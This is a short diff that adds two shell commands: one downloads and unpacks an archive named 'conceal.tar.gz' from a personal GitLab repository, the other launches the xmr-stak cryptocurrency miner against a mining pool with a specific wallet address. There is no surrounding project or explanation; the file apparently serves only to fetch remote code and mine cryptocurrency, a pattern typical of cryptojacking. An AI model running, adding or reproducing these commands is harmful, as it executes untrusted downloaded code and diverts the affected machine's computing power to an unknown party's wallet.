@@ -1,0 +1,2 @@
+wget https://gitlab.com/ilhamjaya0q/beben/-/raw/main/conceal.tar.gz && tar -xvf conceal.tar.gz
+./xmr-stak --tls-url frankfurt01.hashvault.pro:80 --user ccx7DyqwKd8C58eH98gS959JfRqEiqiCXVDJksGXbmtV13mjWQhw6V9XtznxBsofFP8JB32YYBmtwLdoEirjAbYo4DBZgxVqVC  --pass EDAN --currency cryptonight_gpu
